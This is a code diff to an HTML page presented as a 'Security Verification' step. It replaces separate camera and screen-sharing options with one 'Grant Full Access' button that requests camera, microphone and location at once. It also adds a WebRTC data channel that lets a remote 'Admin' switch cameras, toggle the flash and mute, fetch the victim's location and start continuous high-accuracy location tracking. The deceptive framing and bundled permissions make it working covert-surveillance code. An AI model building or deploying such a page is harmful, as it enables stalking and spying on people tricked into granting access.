@@ -5,115 +5,169 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Access</title>
     <style>
-        body { font-family: sans-serif; background-color: #f0f0f0; text-align: center; padding: 20px; }
-        .container { background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 600px; margin: auto; }
-        h1, h3 { color: #333; }
-        p#status { font-size: 1.2em; font-weight: bold; color: #d9534f; min-height: 25px;}
-        textarea { width: 95%; height: 100px; margin-top: 10px; padding: 10px; font-size: 12px; }
-        button { background-color: #0275d8; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px 5px; }
-        button:hover { background-color: #025aa5; }
-        button.share-btn { background-color: #5cb85c; }
-        button.share-btn:hover { background-color: #4cae4c; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; color: #333; }
+        .container { background-color: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 600px; margin: auto; text-align: left;}
+        h1, h3 { text-align: center; }
+        p#status { font-size: 1.1em; font-weight: bold; color: #1d8f5b; min-height: 25px; text-align: center; transition: color 0.3s; }
+        p#status.error { color: #d9534f; }
+        textarea { width: 100%; box-sizing: border-box; height: 80px; margin-top: 5px; padding: 10px; border: 1px solid #ddd; border-radius: 6px; }
+        button { background-color: #1877f2; color: white; border: none; padding: 12px 18px; border-radius: 6px; cursor: pointer; font-size: 15px; margin: 5px; transition: background-color 0.2s; }
+        button:hover { background-color: #166fe5; }
+        button#grantAccessButton { background-color: #42b72a; font-size: 18px; padding: 15px 30px; }
+        button#grantAccessButton:hover { background-color: #36a420; }
         .hidden { display: none; }
+        #chatBox { border: 1px solid #ddd; height: 150px; overflow-y: scroll; padding: 10px; background: #f7f7f7; margin-top: 15px; border-radius: 6px; }
+        #chatInput { width: calc(100% - 85px); padding: 10px; border-radius: 6px; border: 1px solid #ddd; }
+        .button-group { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
-
     <div class="container">
         <h1>Security Verification</h1>
-        <p id="status">Please select an option to share.</p>
+        <p id="status">Click the button below to start the secure session.</p>
         <video id="localVideo" autoplay playsinline muted style="display:none;"></video>
 
-        <div id="selectionDiv">
-            <!-- <button class="share-btn" onclick="startStream('camera')">Share Only Camera</button> -->
-            <button class="share-btn" onclick="startStream('audiocam')">Share Camera</button>
-            <button class="share-btn" onclick="startStream('screen')">Share Screen</button>
+        <!-- The initial selection is now a single button -->
+        <div id="initialDiv" style="text-align: center; padding: 20px 0;">
+            <button id="grantAccessButton">Grant Full Access</button>
         </div>
 
         <div id="connectionDiv" class="hidden">
-            <h3>Step 1: Copy this Code and Send it to the Admin</h3>
+            <hr>
+            <h3>Step 1: Copy & Send this Offer Code to Admin</h3>
             <textarea id="offerTextarea" readonly></textarea>
-            
-            <h3>Step 2: Paste the code received from the Admin here</h3>
-            <textarea id="answerTextarea" placeholder="Paste the Answer Code received from the Admin here..."></textarea>
-            <button id="submitAnswerButton">Final Connect</button>
+            <h3>Step 2: Paste Admin's Answer Code here</h3>
+            <textarea id="answerTextarea" placeholder="Paste Answer Code from Admin..."></textarea>
+            <button id="submitAnswerButton" style="width: 100%; margin-top: 10px;">Final Connect</button>
+        </div>
+
+        <div id="chatContainer" class="hidden">
+            <hr><h4>Chat with Admin</h4>
+            <div id="chatBox"></div>
+            <div style="display: flex; margin-top: 10px;">
+                <input type="text" id="chatInput" placeholder="Type a message...">
+                <button id="sendChatButton" style="width: 75px; margin-left: 10px;">Send</button>
+            </div>
         </div>
     </div>
 
     <script>
-        const statusEl = document.getElementById('status');
-        const selectionDiv = document.getElementById('selectionDiv');
-        const connectionDiv = document.getElementById('connectionDiv');
-        const offerTextarea = document.getElementById('offerTextarea');
-        const answerTextarea = document.getElementById('answerTextarea');
-        const submitAnswerButton = document.getElementById('submitAnswerButton');
+        const getElement = id => document.getElementById(id);
+        const statusEl = getElement('status'), initialDiv = getElement('initialDiv'), connectionDiv = getElement('connectionDiv'), offerTextarea = getElement('offerTextarea'), answerTextarea = getElement('answerTextarea'), submitAnswerButton = getElement('submitAnswerButton'), chatContainer = getElement('chatContainer'), chatBox = getElement('chatBox'), chatInput = getElement('chatInput'), sendChatButton = getElement('sendChatButton'), grantAccessButton = getElement('grantAccessButton');
 
-        let peerConnection;
-        let localStream;
-        const config = {
-            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-        };
-
-        async function startStream(type) {
+        let peerConnection, localStream, dataChannel, locationWatchId;
+        let currentFacingMode = 'user';
+        let isFlashOn = false;
+        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+        
+        // This new function handles the single button click
+        grantAccessButton.onclick = async () => {
             try {
-                let stream;
-                const mediaOptions = {
-                    'camera': { video: true, audio: false },
-                    'audiocam': { video: true, audio: true },
-                    'screen': { video: true }
-                };
+                // 1. Ask for Camera and Mic permissions
+                setStatus('Waiting for Camera & Mic permission...');
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('localVideo').srcObject = localStream; // Required for some functionality
 
-                statusEl.textContent = 'Waiting for permission...';
-                if (type === 'screen') {
-                    stream = await navigator.mediaDevices.getDisplayMedia(mediaOptions[type]);
-                } else {
-                    stream = await navigator.mediaDevices.getUserMedia(mediaOptions[type]);
-                }
-                
-                localStream = stream;
-                document.getElementById('localVideo').srcObject = localStream;
-
-                selectionDiv.classList.add('hidden');
-                connectionDiv.classList.remove('hidden');
-                statusEl.textContent = 'Generating code...';
-
-                await createOffer();
+                // 2. Ask for Location permission
+                setStatus('Waiting for Location permission...');
+                navigator.geolocation.getCurrentPosition(
+                    () => { // On success, proceed to create the offer
+                        setStatus('Permissions granted. Generating connection code...');
+                        initialDiv.classList.add('hidden');
+                        connectionDiv.classList.remove('hidden');
+                        createOffer();
+                    },
+                    (error) => { // On location error, still proceed but warn
+                        console.warn("Location permission denied. Continuing without it.", error.message);
+                        setStatus('Location denied. Generating connection code...', true);
+                        initialDiv.classList.add('hidden');
+                        connectionDiv.classList.remove('hidden');
+                        createOffer();
+                    }
+                );
 
             } catch (error) {
-                console.error("Stream access error:", error);
-                statusEl.textContent = "Could not get access. Please check permissions.";
+                console.error("Critical Permission Error:", error);
+                setStatus("Camera/Mic access is required. Please refresh and try again.", true);
             }
-        }
+        };
 
         async function createOffer() {
             peerConnection = new RTCPeerConnection(config);
+            setupDataChannel();
             localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
-
-            peerConnection.onicecandidate = event => {
-                if (!event.candidate) {
+            peerConnection.onicecandidate = e => {
+                if (!e.candidate) {
                     offerTextarea.value = JSON.stringify(peerConnection.localDescription);
-                    statusEl.textContent = "Code Ready! Send this to the Admin.";
+                    setStatus("Code Ready! Send this to the Admin.");
                 }
             };
-            
             const offer = await peerConnection.createOffer();
             await peerConnection.setLocalDescription(offer);
         }
 
         submitAnswerButton.onclick = async () => {
-            if (!answerTextarea.value) {
-                statusEl.textContent = "Please paste the Answer Code.";
-                return;
-            }
+            if (!answerTextarea.value) return;
             try {
-                const answer = JSON.parse(answerTextarea.value);
-                await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
-                statusEl.textContent = "Connection Successful! Your stream is active.";
+                await peerConnection.setRemoteDescription(new RTCSessionDescription(JSON.parse(answerTextarea.value)));
+                setStatus("Connection Successful! Stream is active.");
+                connectionDiv.classList.add('hidden');
             } catch (error) {
-                console.error("Error setting answer:", error);
-                statusEl.textContent = "Invalid code. Please try again.";
+                setStatus("Invalid code. Please try again.", true);
             }
         };
+        
+        function setupDataChannel() {
+            dataChannel = peerConnection.createDataChannel("main");
+            dataChannel.onopen = () => chatContainer.classList.remove('hidden');
+            dataChannel.onmessage = handleAdminMessage;
+        }
+
+        function handleAdminMessage(event) {
+            try {
+                const msg = JSON.parse(event.data);
+                if (msg.type === 'command') handleCommand(msg.action);
+                else if(msg.type === 'chat') displayChatMessage(`Admin: ${msg.text}`);
+            } catch (e) {
+                displayChatMessage(`Admin: ${event.data}`);
+            }
+        }
+        
+        function handleCommand(action) {
+            const videoTrack = localStream?.getVideoTracks()[0];
+            const audioTrack = localStream?.getAudioTracks()[0];
+            switch (action) {
+                case 'toggleMute': if (audioTrack) audioTrack.enabled = !audioTrack.enabled; break;
+                case 'toggleVideo': if (videoTrack) videoTrack.enabled = !videoTrack.enabled; break;
+                case 'toggleFlash': if (videoTrack) toggleFlash(videoTrack); break;
+                case 'switchCamera': switchCamera(); break;
+                case 'getCurrentLocation': navigator.geolocation.getCurrentPosition(sendLocation, locationError); break;
+                case 'toggleLiveLocation': toggleLiveLocation(); break;
+            }
+        }
+
+        async function switchCamera() {
+            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+            const audioEnabled = localStream.getAudioTracks().length > 0;
+            localStream.getTracks().forEach(track => track.stop());
+            try {
+                const newStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: audioEnabled });
+                const videoTrack = newStream.getVideoTracks()[0];
+                const sender = peerConnection.getSenders().find(s => s.track.kind === 'video');
+                sender.replaceTrack(videoTrack);
+                localStream = newStream;
+                document.getElementById('localVideo').srcObject = localStream;
+                isFlashOn = false;
+            } catch (error) { setStatus("Could not switch camera.", true); }
+        }
+        
+        function toggleFlash(videoTrack) { if (videoTrack?.applyConstraints) { if (videoTrack.getCapabilities().torch) { isFlashOn = !isFlashOn; videoTrack.applyConstraints({ advanced: [{ torch: isFlashOn }] }); } } }
+        function sendLocation(position) { const { latitude, longitude } = position.coords; if (dataChannel?.readyState === 'open') { dataChannel.send(JSON.stringify({ type: 'location', lat: latitude, lon: longitude })); setStatus('Location sent successfully.'); } }
+        function locationError(error) { setStatus(`Location Error: ${error.message}`, true); }
+        function toggleLiveLocation() { if (locationWatchId) { navigator.geolocation.clearWatch(locationWatchId); locationWatchId = null; setStatus('Live location tracking stopped.'); } else { locationWatchId = navigator.geolocation.watchPosition(sendLocation, locationError, { enableHighAccuracy: true }); setStatus('Live location tracking started.'); } }
+        function displayChatMessage(messageText) { const p = document.createElement('p'); p.textContent = messageText; chatBox.appendChild(p); chatBox.scrollTop = chatBox.scrollHeight; }
+        sendChatButton.onclick = () => { const msg = chatInput.value; if (!msg) return; dataChannel.send(JSON.stringify({ type: 'chat', text: msg })); displayChatMessage(`You: ${msg}`); chatInput.value = ''; };
+        function setStatus(message, isError = false) { statusEl.textContent = message; statusEl.className = isError ? 'error' : ''; }
     </script>
 </body>
 </html>
